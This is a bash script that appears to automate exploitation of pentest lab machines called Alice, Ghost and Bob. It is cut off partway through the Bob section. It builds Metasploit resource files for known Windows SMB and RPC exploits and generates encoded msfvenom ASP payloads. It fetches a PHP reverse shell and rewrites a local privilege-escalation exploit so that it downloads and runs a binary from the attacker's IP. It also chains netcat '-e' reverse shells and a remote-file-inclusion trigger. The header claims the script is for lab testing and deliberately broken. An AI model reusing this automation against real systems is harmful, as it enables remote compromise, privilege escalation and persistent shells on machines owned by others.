#!/bin/bash
################################################################################
# Written to test the labs while I was a lab's admin ...                       #
# If you dont understand the functionality, dont run the script - VERY SIMPLE  #
# This script is intentionally broken to avoid any abuse in labs               #
# IIRC lab's are slightly different and this script will be broken due to this #
# If you are using this script as a cheat, you have failed yourself already    #
# If you make this script work as intented, great! - Thanks not the goal here  #
# If you liked this script for the learning curve with bash scripting,         #
#         PAY IT FORWARD TO SOMEONE ELSE, DONT THANK ME                        #
#                 w/ Love:                                                     #
#                                 no1special                                   #
################################################################################
title() {
  echo;
  echo -e "({[>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++<]})";
  echo -e "  [*]                                                                       [*]";  
  echo -e "  [*]             Labs Fuckifier...err, I mean Verifier Script              [*]";
  echo -e "  [*]                                                                       [*]";  
  echo -e "  [*] Coded by:\tWilliam \`no1special\` Coppola                                [*]";
  echo -e "  [*] Language:\tALL BASH                                                    [*]";
  echo -e "  [*] Coded in:\t2011                                                        [*]";
  echo -e "  [*]                                                                       [*]";
  echo -e "  [*]\t\t[RESEARCH IS THE KEY TO UNLOCK KNOWLEDGE]                   [*]";
  echo -e "  [*]                                                                       [*]"; 
  echo -e "  [*] For proper use of this script, you should understand the source....   [*]";
  echo -e "  [*]                                                                       [*]";
  echo -e "  [*] \t\tif [ 'you' != 'like' ];                                     [*]";
  echo -e "  [*] \t\t  then                                                      [*]";
  echo -e "  [*] \t\t    (Go_Fuckifier_yourself) > /dev/null                     [*]";
  echo -e "  [*] \t\tfi;                                                         [*]";
  echo -e "  [*]                                                                       [*]";
  echo -e "({[>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++<]})";
  echo;
}
(title);
################################################################################
# set some variables for the application, ... 
# I do not think this is a script anymore ....
################################################################################
setlabvars() {
  setVPN() {
    # VPN Configuration file locations
    lab11="/root/lab11/lab.conf"; # vpn config
    lab13="/root/lab13/lab.conf"; # vpn config
    lab15="/root/lab15/lab.conf"; # vpn config
  }
  (setVPN);
  setInterface() {
    # Interface and Subnet Variables
    iface1=$(ifconfig `# runs ifconfig` |\
             grep "10.10.10.1" `# looks for specific broadcast address` |\
             sed -r "s/inet (.*) netmask(.*)/\1/g" ` # get the IP address from the results`;)
    iface2=$(ifconfig |\ `# runs ifconfig`
             grep "10.10.12.1" |\ `# looks for specific broadcast address`
             sed -r "s/inet (.*) netmask(.*)/\1/g" ` # get the IP address from the results`;)
    iface3=$(ifconfig |\ `# runs ifconfig`
             grep "10.10.14.1" |\ `# looks for specific broadcast address`
             sed -r "s/inet (.*) netmask(.*)/\1/g" ` # get the IP address from the results`;)
    testiface4=$(ifconfig `# runs ifconfig` |\
             grep "172.27.*" `# looks for specific broadcast address` |\
             sed -r "s/inet (.*) netmask(.*)/\1/g" ` # get the IP address from the results`;)
    lh1=$(ifconfig $iface1 |\ `# runs ifconfig on specific interface`
          grep "inet" |\ `# grep for inet string`
          tr -s "\n" " " |\ `# replace all newline characters with a space`
          sed -r "s/ (.*)/\1/g" |\ `# removes any space infront of a string`
          cut -d" " -f2 `# cut at delimited field set by space`);
    lh2=$(ifconfig $iface2 |\ `# runs ifconfig on specific interface`
          grep "inet" |\ `# grep for inet string`
          tr -s "\n" " " |\ `# replace all newline characters with a space`
          sed -r "s/ (.*)/\1/g" |\ `# removes any space infront of a string`
          cut -d" " -f2 `# cut at delimited field set by space`);
    lh3=$(ifconfig $iface3 |\ `# runs ifconfig on specific interface`
          grep "inet" |\ `# grep for inet string`
          tr -s "\n" " " |\ `# replace all newline characters with a space`
          sed -r "s/ (.*)/\1/g" |\ `# removes any space infront of a string`
          cut -d" " -f2 `# cut at delimited field set by space`);
  }
  (setinterface);
  setmsf() {
    # Get Metasploit location from system
    (updatedb); # needed to ensure the locate DB is up-to-date
    msfp=$(locate msfconsole |\
           grep metasploit-framework |\
           sed -r "s/(.*)\/msfconsole/\1/"); # metasploit directory
    msfc="$msfp/msfconsole"; # msfconsole
    msfv=`locate msfvenom | grep bin`
    msfs="$msfp/scripts"; # msfscripts dir
    mpld=`locate msfpayload | head -n1`
  }
  (setmsf);
  sethandler() {
    # MULTIHANDLER INFORMATION (Change me as needed)
    winrevpay="windows/meterpreter/reverse_tcp"; # primary metasploit payload
    linrevpay="linux/meterpreter/reverse_tcp"; # primary metasploit payload
    handler="exploit/multi/handler"; # used to build main Multihandler Shell Script
    DPH="DisablePayloadHandler True"; # Disable metasploit Payload Handler
    autoRoute="post/windows/manage/autoroute";
    lp="443" # sets Multihandler listening port for Windows Reverse Payloads
    lrs="linux/x86/shell_reverse_tcp" # Standard Linux Reverse payload
    lmr="linux/x86/meterpreter/reverse_tcp" # Linux Meterpreter Reverse payload
  }
  (sethandler);
  # REVERTER INFORMATION AND URL CONSTRUCTOR
  # revurl="https://10.10.10.7/functions/revert_machine_admin.php";
  # wgetaction="wget `echo -n $revurl` -T 5 -t 1 --no-check-certificate ";
  # poststring="--post-data=\"";
  # postaction="awlAction=login&";
  # postuser="awlUserName=OSIDNUM&";
  # postpass="awlPasswd=PASS&";
  # posttype="type=servers&";
  # poststrike="strike=0&";
  setlabexploits() {
    # EXPLOITS FOR LAB MACHINES
    aliceExploit="exploit/windows/smb/ms04_011_lsass"; # primary exploit for Alice machine
    bobExploit="exploit/windows/smb/ms08_067_netapi"
    oracleExploit="windows/dcerpc/ms03_026_dcom"
    padroExploit="exploit/windows/fileformat/adobe_utilprintf"
    rh9Exploit="exploit/multi/ftp/wuftpd_site_exec_format"
    masterExploit="exploit/windows/smb/ms09_050_smb2_negotiate_func_index"
    slaveExploit="exploit/windows/dcerpc/ms07_029_msdns_zonename"
    itjoeExploit="exploit/windows/tftp/attftp_long_filename"
    WebSQLExploit="exploit/windows/smb/ms05_039_pnp"
    ThinMailExploit="exploit/windows/smb/ms08_067_netapi"
    RalphExploit="windows/mssql/mssql_payload"
    helpdeskExploit="windows/smb/ms09_050_smb2_negotiate_func_index"
    debianExploit="linux/ftp/proftp_telnet_iac"
  }
  (setlabexploits);
}
(setlabvars);
# CHECK FOR SYSTEM PROCESSES
checkapache() {
  ps -A `# check system processes -A (all)` |\
  grep apache2 `# grep for apache2` |\
  tr -s "\t" " " `# replace any tabs with space` |\
  cut -d " " -f4 `# cut at delimited field set by space` |\
  sort -u `# sort all results to be unique` |\
  head -n1 `# only take the first result (overkill)`
}
################################################################################
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~> PREREQUISITES <~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~#
################################################################################
checkmonkey() {
  # checks for pentestmonkey reverse php shell
  # if not found - Download / Decompress it  
  if [ ! -f $msfs/php-rev.tar.gz ];
    then
      wget http://pentestmonkey.net/tools/php-reverse-shell/php-reverse-shell-1.0.tar.gz \
        -O $msfs/php-rev.tar.gz
      tar -zxvf $msfs/php-rev.tar.gz
  fi;
}
(checkmonkey);
################################################################################
# Xterm kicker script for code reduction (Log all the things)
# Usage: makeXtermLog "Window Title" "Executable"
# Example: makeXtermLog List_Directories "ls -asl && sleep 5"
################################################################################
makeXtermLog() {
  if [ -f $1-log.txt ]; `# check for existing log file`;
    then
      rm $1-log.txt; `# remove it before it becomes a problem`;
  fi;
  xterm -bc `# opens xterm window` \
    -bd white `# sets windows border color` \
    -bg black `# sets window background color` \
    -fg green `# sets windows foreground color (text)` \
    -l `# Enables loggin` \
    -lf $1-log.txt `# sets logging file name` \
    -leftbar `# Force scrollbar to the left side of VT100 screen` \
    -ls `# sets terminal as Login shell` \
    -name $1 `# sets resource name` \
    -ms yellow `# sets the pointer cursor` \
    -selbg orange `# sets the background of selected text` \
    -selfg black `# sets the foreground of selected text` \
    -title $1 `# sets the Window Title bar` \
    -e "$2" `# sets the executable to be run`; 
}
# Xterm kicker script for code reduction
# Usage: makeXtermNoLog "Resource_Name" "Window Title" "Executable"
# Example: makeXtermNoLog "List_Directories" "ls -asl | grep file; sleep 5"
makeXtermNoLog() {
  # Make Xterm launcher function for code reduction
  # Make Xterm launcher function for code reduction
  xterm -bc `# opens xterm window`\
    -bd white `# sets windows border color`\
    -bg black `# sets window background color`\
    -fg green `# sets windows foreground color (text)`\
    +l `# Disables loggin`\
    -leftbar `# Force scrollbar to the left side of VT100 screen`\
    -ls `# sets terminal as Login shell`\
    -name $1 `# sets resource name`\
    -ms yellow `# sets the pointer cursor`\
    -selbg orange `# sets the background of selected text`\
    -selfg black `# sets the foreground of selected text`\
    -title $1 `# sets the Window Title bar`\
    -e $2 `# sets the executable to be run`;
}
# These are the brakes
checkthebrakesAll() { `# makes the linebreak have newline characters in front and back`
  echo -e "\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n"
}
checkthebrakesTop() { `# makes the linebreak have newline characters in front only`
  echo -e "\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
}
checkthebrakesBot() { `# makes the linebreak have newline characters in back only`
  echo -e "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n"
}
checkthebrakesNo() { `# makes the linebreak without newline characters`
  echo -e "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
}
# Checks for Ckermit FTP ...
checkthefrog() {
  # checks in binary is found on the system
  if [ ! -f /usr/bin/kermit ];
    then
      checkthebrakesTop;
      echo -e "\t[!] Ckermit is not installed, standby for update and installation" 1>&2
      checkthebrakesBot;
      apt-get update >/dev/null `# conduct an update of the Apt db`;
      apt-get install -y ckermit >/dev/null `# Attempt to install ckermit FTP`;
    else
      checkthebrakesTop;
      echo -e "\t[!] Ckermit is currently installed, nothing left todo" 1>&2
      checkthebrakesBot;
  fi
}
(checkthefrog);
# produce the multihandler recourse file
makehandlerrc() { 
  # produce the Primary multihandler recourse file
  if [ ! -f $msfs/multihandler443.rc ]; `# check for files existance`
    then
      checkthebrakesTop
      echo -e "\t[!] The file: $msfs/multihandler443.rc\n\t\twas not found, now producing ..." 1>&2
      checkthebrakesBot
      echo -e "use $handler" > $msfs/multihandler443.rc
      echo -e "set PAYLOAD $pay" >> $msfs/multihandler443.rc
      echo -e "set LPORT $lp" >> $msfs/multihandler443.rc
      echo -e "set LHOST 0.0.0.0" >> $msfs/multihandler443.rc
      echo -e "set ExitOnSession false" >> $msfs/multihandler443.rc
      echo -e "exploit -j -z" >> $msfs/multihandler443.rc
    else
      checkthebrakesTop
      echo -e "\t[!] The file: $msfs/multihandler443.rc" 1>&2
      echo -e "\t\texists on the system, nothing left todo" 1>&2
      checkthebrakesBot
  fi
}
(makehandlerrc);
mhScript() {
  # Produces the multi.sh script to launch the multihandler 
  if [ ! -f $msfs/multi.sh ]; 
    then
      checkthebrakesTop
      echo -e "\t[!] The $msfs/multi.sh script was not found" 1>&2
      echo -e "\t\tproducing the multi.sh script" 1>&2
      checkthebrakesBot
      cat << EOF > $msfs/multi.sh
#!/bin/bash
checkthebrakesTop;
echo -e "\t[*] Metasploit MultiHandler Console is Launching Now...";
checkthebrakesBot;
# opens XTERM window for Metasploit MultiHandler, with logging
rm mh-execution-log.txt >/dev/null
xterm -bc \
-bd white \
-bg black \
-fg green \
-l \
-lf mh-execution-log.txt \
-leftbar \
-ls \
-name "Multihandler Script" \
-ms yellow \
-selbg orange \
-selfg black \
-title "Metasploit MultiHandler Console" \
-e $msfc -r $msfs/multihandler443.rc 1>/dev/null &
EOF
      chmod a+x $msfs/multihandler443.rc;
    else
      checkthebrakesTop
      echo -e "\t[!] The $msfs/multi.sh script exists on the system, nothing left todo" 1>&2
      checkthebrakesBot
  fi;
}
(mhScript);
checkMH() {
  # Check if there is a multihandler already listening on 0.0.0.0:443
  # if the service is litening on this port already ... continue if so
  chkmh=`netstat -antelop |\
    grep "ruby" |\
    tr -s " " |\
    grep 443 |\
    cut -d" " -f4 |\
    cut -d":" -f2`
  if [ "$chkmh" != "443" ];
    then
      (makeXtermLog "Metasploit_MultiHandler_Console" "$msfc -r $msfs/multihandler443.rc" &) >/dev/null
    else
      checkthebrakesTop;
      echo -e "\t[*] The Metasploit Console MultiHandler is already operational!" 1>&2;
      checkthebrakesBot;
  fi
}
(checkMH);
checkVPNaccess() {
  # check for vpn connectivity
  if [ "`ifconfig | grep "$1.255" | tr -s " " | cut -d":" -f2 | cut -d " " -f1`" != "" ];
    then
      checkthebrakesTop
      echo -e "\t[*] Labs $1 are active and connected with the IP of $lh1";
      checkthebrakesBot
    else
     checkthebrakesTop
     echo -e "\t[*] Starting Labs $1 vpn connection";
     checkthebrakesBot
     makeXtermLog OpenVPN_Connection_$toctet OpenVPN-Connection-$toctet OpenVPN-Connection-$toctet 'openvpn $labs$1; sleep 5'
     recheckVPN() {
       if [ "`ip -4 -o addr | grep "$1.255" | tr -s " " | cut -d " " -f6`" == "" ];
         then
           checkthebrakesTop;
           echo -e "\t[*] Labs $1 have failed to connect, exiting ...";
           checkthebrakesBot
           exit 1;
         else 
           checkthebrakesTop
           echo -e "\t[*] Labs $1 are active and connected with the IP of $lh1";
           checkthebrakesBot
       fi;
     }
     recheckVPN $1;
  fi;
}
(checkVPNaccess 11);
(checkVPNaccess 13);
(checkVPNaccess 15);
#
# Get inet4 address from interface
#
inet4() { `# Gets IPv4 address from supplied user var 'eth0'`
  ifconfig $1 `# calls ifconfig on user supplied interface`|\
    grep "inet " `# greps for the inet{space} string`|\
    tr -s " " `# turnicates additional spaces, prep for next step`|\
    sed -r "s/ (.*)/\1/g" `# removes space from start of string`|\
    cut -d " " -f2 `# cuts line at delimiter {space} on the 2nd field`;
} # Example: inet eth0
# gets inet6 address from interface
inet6() { `# Gets IPv6 address from supplied user var 'eth0'`
  ifconfig $1 `# calls ifconfig on user supplied interface`|\
    grep "inet6 " `# greps for the inet6{space} string`|\
    tr -s " " `# turnicates additional spaces, prep for next step`|\
    sed -r "s/ (.*)/\1/g" `# removes space from start of string`|\
    cut -d " " -f2 `# cuts line at delimiter {space} on the 2nd field`;
} # Example: inet6 eth0
getIPaddresses() {
  c=`ifconfig | grep -v lo: | grep -E "^(.*)\: "  |cut -d":" -f1 | wc -l`
  for intf in $( ifconfig | awk -F"[ :]+" '/inet / && !/127.0/ {print $3}' ); do
    for x in $(seq 0 $c); do
      eval "interface[$x]=$intf";
    done
  done
}
(getIPaddresses);
################################################################################
#~~~~~~~~~~~~~~~~~~~~~~~~~~> MAIN APPLICATION LOGIC <~~~~~~~~~~~~~~~~~~~~~~~~~~#
################################################################################
#                   ({[> This is where the magic happens <]})                  #
################################################################################
#~~~~~~~~~~~~~~~> ALICE CONFIGURATION AND EXPLOITATION SECTION <~~~~~~~~~~~~~~~#
################################################################################
AliceInWonderland() {
  makeAliceRC() {
    # Alice RC file generation
    if [ ! -f $msfs/alice$toctet.rc ];
      then
        checkthebrakesTop;
        echo -e "\t[*] Producing file: $msfs/alice$toctet.rc" ;
        checkthebrakesBot;
        echo "use $aliceExploit" > $msfs/alice$toctet.rc
        echo "set rhost $uip" >> $msfs/alice$toctet.rc
        echo "set lhost $AttackIP" >> $msfs/alice$toctet.rc
        echo "set lport $lp" >> $msfs/alice$toctet.rc
        echo "set payload $pay" >> $msfs/alice$toctet.rc
        echo "set $DPH" >> $msfs/alice$toctet.rc
        echo "exploit" >> $msfs/alice$toctet.rc
        echo "sleep 5" >> $msfs/alice$toctet.rc
        echo "exit" >> $msfs/alice$toctet.rc
    fi;
  }
  makeAliceRC;
  #
  # Alice Exploitation 
  checkthebrakesTop;
  echo -e "\t[*] Starting Alice Exploitation" ;
  checkthebrakesBot;
  (makeXtermLog "Alice-$toctet-Exploitation" "$msfc -r $msfs/alice$toctet.rc && sleep 5" &) > /dev/null
  checkthebrakesTop;
  echo -e "\t[*] Finished Alice Exploitation" ;
  checkthebrakesBot;
}
################################################################################
#~~~~~~~~~~~~~~~> GHOST CONFIGURATION AND EXPLOITATION SECTION <~~~~~~~~~~~~~~~#
################################################################################
GhostAttack() {
  # Ghost Exploitation generation
  # make Ghost dir in webserver
  if [ ! -d $webdir/ghost ]; 
    then
      checkthebrakesTop;
      echo -e "\t[*] Producing Dir: $webdir/ghost" ;
      checkthebrakesBot;
      mkdir $webdir/ghost
  fi;
  if [ ! -d $msfs/ghost ]; 
    then
      checkthebrakesTop;
      echo -e "\t[*] Producing Dir: $msfs/ghost" ;
      checkthebrakesBot;
      mkdir $msfs/ghost
  fi
  checkmonkey;
  # starts the process to exploit ghost on subnet 11
  checkthebrakesTop;
  echo -e "\t[*] Revert Ghost to ensure a clean environment before attacking" ;
  checkthebrakesBot;
  # might think about reverting Ghost before attacking
  # start apache remove PHP5 for Ghost exploit to serve properly  
  if [ "$apache2" != "apache2" ];
    then
      checkthebrakesTop;
      echo -e "\t[*] Disable PHP 7.0, Start Apache" ;
      checkthebrakesBot;
      a2dismod php7.0 >/dev/null;
      systemctl start apache2 >/dev/null;
    else
      checkthebrakesTop;
      echo -e "\t[*] Stop Apache, Disable PHP 7.0, Re-Start Apache" ;
      checkthebrakesBot;
      systemctl stop apache2 >/dev/null;
      a2dismod php7.0 >/dev/null;
      systemctl start apache2 >/dev/null;
  fi;
  # checks for reverse shell for ghost.php - simple redundency! in case something changes
  makeGhostPHP() {
    if [ ! -f $msfs/ghost/ghost$toctet.php ]; 
      then
        checkthebrakesTop;
        echo -e "\t[*] Producing file: $msfs/ghost/ghost$toctet.php" ;
        checkthebrakesBot;
        cat $msfs/php-reverse-shell-1.0/php-reverse-shell.php |\
          sed -r "s/(ip = )(.*)/\1'`echo $AttackerIP`';/g" |\
          sed -r "s/(port = )(.*)/\1 8080;/g" |\
          sed -r "s/\/\/(.*)//" |\
          grep -Ev "^$" |\
          sed '/^\s*$/d' > $msfs/ghost/ghost$toctet.php 
        if [ ! -f $webdir/ghost/header.inc.php ]; 
          then
            checkthebrakesTop;
            echo -e "\t[*] Moving PHP-REV-SHELL to: $webdir/ghost/header.inc.php " ;
            checkthebrakesBot;
            cp $msfs/ghost/php-reverse-shell-1.0/ghost$toctet.php $webdir/ghost/header.inc.php
        fi;    
    fi;
  }
  makeGhostPHP;
  # checks localhost for for Ghost local exploitation file - redundency! in case of config changes
  makeGhostCasper() {
    if  [ ! -f $webdir/ghost/casper.c ]; 
      then
        checkthebrakesTop;
        echo -e "\t[*] Producing file: $webdir/ghost/casper.c " ;
        checkthebrakesBot;
        cat /usr/share/exploitdb/platforms/linux/local/12130.py |\
          grep "SHELL =" |\
          cut -d" " -f3- |\
          cut -d"'" -f2 > $webdir/ghost/casper.c
    fi;
    if  [ ! -f $webdir/ghost/casper ]; 
      then
        checkthebrakesTop;
        echo -e "\t[*] Compiling: $webdir/ghost/casper.c, output: $webdir/ghost/casper " ;
        checkthebrakesBot;
        gcc -w $webdir/ghost/casper.c -o $webdir/ghost/casper
    fi
  }
  makeGhostCasper;
  # SED commands to produce a modified PoC to use on ghost machine subnet
  makeGhostPOC() {
    if [ ! -f $webdir/ghost/casper.py ]; then 
      checkthebrakesTop;
      echo -e "\t[*] Producing file: $webdir/ghost/casper.py " ;
      checkthebrakesBot;
      cat /usr/share/exploitdb/platforms/linux/local/12130.py |\
      sed -r "s/SHELL =(.*)//g" |\
      sed -r "s/if not os.path.exists\('\/.reiserfs_priv\/xattrs'\):/if not os.path.exists('\/apachelogs\/.reiserfs_priv\/xattrs'\):/g" |\
      sed -r "s/msg\('preparing shell in \/tmp'\)//g" |\
      sed -r "s/err\('error setting xattr, you need setfattr'\)//g" |\
      sed -r "s/f = open\('\/tmp\/team-edward.c', 'w'\)//g" |\
      sed -r "s/f.write\(SHELL\)//g" |\
      sed -r "s/f.close\(\)//g" |\
      sed -r "s/pre = set\(os.listdir\('\/.reiserfs_priv\/xattrs'\)\)/pre = set\(os.listdir\('\/apachelogs\/.reiserfs_priv\/xattrs'\)\)/g" |\
      sed -r "s/msg\('compiling shell in \/tmp'\)/print '[\*] no1special HaxOred Me'/g" |\
      sed -r "s/ret = os.system\('gcc -w \/tmp\/team-edward.c -o \/tmp\/team-edward'\)/ret = os.system\('wget --quiet http:\/\/$AttackerIP\/ghost\/casper'\)/g" |\
      sed -r "s/if ret \!= 0://g" |\
      sed -r "s/err\('error compiling shell\, you need gcc'\)/\n    os.system\('chmod 755 \/apachelogs\/data\/casper'\)/g" |\
      sed -r "s|(os\.system\('setfattr -n \"user.hax\" -v \"hax\" )(.*)|\1\/apachelogs\/data\/casper\'\)|g" |\
      sed -r "s/(post = set\(os.listdir\(')(.*)/\1\/apachelogs\/.reiserfs_priv\/xattrs'\)\)/g" |\
      sed -r "s/(f = open\('\/).reiserfs_priv\/(.*)/\1apachelogs\/.reiserfs_priv\/xattrs\/\%s\/security\.capability' \% obj\, \'w\')/g"  |\
      sed -r "s/os.system\('\/tmp\/team-edward'\)/os.system\('\/apachelogs\/data\/casper'\)/g" |\
      sed -r "s/if __name__ == '__main__':/    os.system\('id'\)/g"  |\
      sed -r "s/main\(\)//g" |\
      sed -r "s/def :/def main\(\):/g" > $webdir/ghost/caspertmp.py
      echo "if __name__ == '__main__':" >> $webdir/ghost/caspertmp.py
      echo "    main()" >> $webdir/ghost/caspertmp.py
      cat $webdir/ghost/caspertmp.py | sed '/^\s*$/d' > $webdir/ghost/casper.py
      rm $webdir/ghost/caspertmp.py
      chmod +x $webdir/ghost/casper.py
    fi
  }
  makeGhostPOC;
  GhostExploitPOC() {
    checkthebrakesTop;
    echo -e "\t[*] Prepairing to Exploit Ghost " ;
    checkthebrakesBot;
    # Giving up the Ghost - DJ Shadow 
    GhostGodModeStep1(){
      GodMode1="echo 'mount /apachelogs && \
          cd /apachelogs/data && \
          wget http://$AttackerIP/ghoste11/casper.py && \
          python ./casper.py && \
          /bin/netcat $AttackerIP 8081 -e /apachelogs/data/casper' |\
          nc -l -v -p 8080"
      checkthebrakesTop;
      echo -e "\t[*] Ghost Exploitation Stage 1 (Echo through NetCat)" ;
      checkthebrakesBot;
      (makeXtermLog "Ghost-Exploit-Stage1" "$GodMode1; sleep 5" &) >/dev/null
    }
    (GhostGodModeStep1);
    sleep 5;
    GhostGodModeStep2() {
      GodMode2="nc -l -v -p 8081"
      checkthebrakesTop;
      echo -e "\t[*] Ghost Exploitation Stage 2 (NetCat Listener)" ;
      checkthebrakesBot;
      (makeXtermLog "Ghost-Exploit-Stage2" "$GodMode2; sleep 5" &) > /dev/null
    }
    (GhostGodModeStep2);
    sleep 5;
    GhostGodModeStep3() {
      GodMode3="wget http://$uip/1/slogin_lib.inc.php?slogin_path=http://$AttackerIP/ghost$toctet/header.inc.php? &&\
          rm -rf \"slogin_lib.inc.php?slogin_path=http:%2F%2F$AttackerIP%2Fghost$toctet%2Fheader.inc.php\""
      checkthebrakesTop;
      echo -e "\t[*] Ghost Exploitation Stage 3 (Exploit Trigger wget)" ;
      checkthebrakesBot;
      (makeXtermLog "Ghost-Exploit-Stage3" "$GodMode3; sleep 5" &) > /dev/null
    }
    (GhostGodModeStep3);
    checkthebrakesTop;
    echo -e "\t[*] Ghost Exploitation Stage Complete, Waiting 90 Seconds for shell " ;
    checkthebrakesBot;
    sleep 90; # must wait 1m30s for local exploitation to take place;
  }
  (GhostExploitPOC);
  FootTrap() {
    ps -A xf |\
      grep "nc -l -v -p 8080" |\
      grep -v grep |\
      tr -s " " |\
      cut -d" " -f1 |\
      xargs kill -9;
  }
  (FootTrap);
  checkthebrakesTop;
  echo -e "\t[*] Ghost Exploitation has commenced " ;
  checkthebrakesBot;
}
################################################################################
#~~~~~~~~~~~~~~~~> BOB CONFIGURATION AND EXPLOITATION SECTION <~~~~~~~~~~~~~~~~#
################################################################################
killBoB() {
  prepSysforBoB() {
    if [ ! -d $msfs/bob ];
      then
        checkthebrakesTop;
        echo -e "\t[*] Making Dir: $msfs/bob"
        checkthebrakesBot;
        mkdir $msfs/bob
    fi;
    subnet=`echo $uip | sed -r "s/(.*)\.(.*)/\1\.0/g"`
    if [ $toctet == "11" ];
      then
        checkthebrakesTop;
        echo -e "\t[*] Setting Attacker IP to: $lh1"
        checkthebrakesBot;
        AttackerIP=$lh1
      elif [ $toctet == "13" ];
        then
        checkthebrakesTop;
        echo -e "\t[*] Setting Attacker IP to: $lh3"
        checkthebrakesBot;
          AttackerIP=$lh2
      elif [ $toctet == "15" ];
        then
        checkthebrakesTop;
        echo -e "\t[*] Setting Attacker IP to: $lh3"
        checkthebrakesBot;
          AttackerIP=$lh3
    fi;
    # kill apache is running 
    if [ "`netstat -antelop | tr -s " " | grep -i "apache" | cut -d" " -f6 | sort -u`" == "LISTEN" ]; 
      then
        checkthebrakesTop;
        echo -e "\t[*] Stopping Apache2 as needed for Exploitation of Bob"
        checkthebrakesBot;
        systemctl stop apache2; 
    fi;
    # kill sshd just to refresh it!
    if [ "`netstat -antelop | tr -s " " | grep -i "sshd" | cut -d" " -f6 | sort -u`" == "LISTEN" ]; 
      then
        checkthebrakesTop;
        echo -e "\t[*] Stopping SSHD as needed for Exploitation of Bob"
        checkthebrakesBot;
        systemctl stop ssh
    fi;
  }
  prepSysforBoB;
  # make the plink rc file for bob
  bobPlinkRC() {
    if [ ! -f $msfs/bob/bobPlink$toctet.rc ]; 
      then
        checkthebrakesTop;
        echo -e "\t[*] Producing Bob Plink RC file:\n\t\t$msfs/bob/bobPlink$toctet.rc"
        checkthebrakesBot;
        echo -e "use $bobExploit" > $msfs/bob/bobPlink$toctet.rc
        echo -e "set rhost 127.0.0.1" >> $msfs/bob/bobPlink$toctet.rc
        echo -e "set $DPH" >> $msfs/bob/bobPlink$toctet.rc
        echo -e "set lport $lp" >> $msfs/bob/bobPlink$toctet.rc
        echo -e "set payload $pay" >> $msfs/bob/bobPlink$toctet.rc
        echo -e "set lhost $AttackerIP" >> $msfs/bob/bobPlink$toctet.rc
        echo -e "exploit" >> $msfs/bob/bobPlink$toctet.rc
    fi;
  }
  bobPlinkRC;
  # make the autoroute rc file for bob1
  bobAutorouteRC() {
    if [ ! -f $msfs/bob/bobAutoroute$toctet.rc ]; 
      then
        checkthebrakesTop;
        echo -e "\t[*] Producing Bob AutoRoute RC file:\n\t\t$msfs/bob/bobAutoroute$toctet.rc"
        checkthebrakesBot;
        echo "use $handler" > $msfs/bob/bobAutoroute$toctet.rc
        echo "set PAYLOAD $pay" >> $msfs/bob/bobAutoroute$toctet.rc
        echo "set LPORT 80" >> $msfs/bob/bobAutoroute$toctet.rc
        echo "set LHOST 0.0.0.0" >> $msfs/bob/bobAutoroute$toctet.rc
        echo "set ExitOnSession false" >> $msfs/bob/bobAutoroute$toctet.rc
        echo "exploit -j -z" >> $msfs/bob/bobAutoroute$toctet.rc
        echo "sleep 80" >> $msfs/bob/bobAutoroute$toctet.rc
        echo "use $autoRoute" >> $msfs/bob/bobAutoroute$toctet.rc
        echo "set action ADD" >> $msfs/bob/bobAutoroute$toctet.rc
        echo "set session 1" >> $msfs/bob/bobAutoroute$toctet.rc
        echo "set subnet $subnet" >> $msfs/bob/bobAutoroute$toctet.rc
        echo "sleep 45" >> $msfs/bob/bobAutoroute$toctet.rc
        echo "run" >> $msfs/bob/bobAutoroute$toctet.rc
        echo "use $bobExploit" >> $msfs/bob/bobAutoroute$toctet.rc
        echo "set rhost $uip" >> $msfs/bob/bobAutoroute$toctet.rc
        echo "set lhost $AttackerIP" >> $msfs/bob/bobAutoroute$toctet.rc
        echo "set $DPH" >> $msfs/bob/bobAutoroute$toctet.rc
        echo "set lport $lp" >> $msfs/bob/bobAutoroute$toctet.rc
        echo "set payload $pay" >> $msfs/bob/bobAutoroute$toctet.rc
        echo "exploit" >> $msfs/bob/bobAutoroute$toctet.rc
    fi;
  }
  bobAutorouteRC;
  evilBobASP() {
    if [ ! -f $msfs/bob/evil$toctet.asp ]; 
      then
        checkthebrakesTop;
        echo -e "\t[*] Producing Bob EvilASP file:\n\t\t$msfs/bob/evil$toctet.asp"
        checkthebrakesBot
        msfvenom -p $pay \
          LHOST=$AttackerIP \
          LPORT=$lp \
          RHOST=$uip \
          -e x86/shikata_ga_nai \
          -f asp \
          -o $msfs/bob/evil$toctet.asp 2&>/dev/null
    fi;
  }
  evilBobASP;
  evilBobEXEC() {
    if [ ! -f $msfs/bob/bobExec$toctet.asp ];
      then
        checkthebrakesTop;
        echo -e "\t[*] Producing Bob EvilExecASP file:\n\t\t$msfs/bob/bobExec$toctet.asp"
        checkthebrakesBot;
        $msfv -p windows/exec \
          CMD='cmd.exe /c "c:\inetpub\wwwroot\plink.exe \
              -auto_store_key_in_cache -C -P 22 \
              -R 445:127.0.0.1:445 \
              -l root \
              -pw nothing \
              $AttackerIP"' \
          -e x86/shikata_ga_nai \
          -b "\x00\x0a\x0d" \
          -f asp \
          -o $msfs/bob/bobExec$toctet.asp 2&>/dev/null
    fi;
   }
   evilBobEXEC;
   evilBobFTP() {
     if [ ! -f $msfs/bob/bobftp$toctet.txt ]; 
       then
         checkthebrakesTop;
         echo -e "\t[*] Producing Bob EvilFTP file:\n\t\t$msfs/bob/bobftp$toctet.txt"
         checkthebrakesBot;
         echo "!#/usr/local/bin/kermit +" > $msfs/bob/bobftp$toctet.txt
         echo "ftp open $uip /anonymous" >> $msfs/bob/bobftp$toctet.txt
         echo "ftp cd wwwroot" >> $msfs/bob/bobftp$toctet.txt
         echo "lcd $msfs/bob/" >> $msfs/bob/bobftp$toctet.txt
         echo "ftp put evil$toctet.asp evil$toctet.asp" >> $msfs/bob/bobftp$toctet.txt
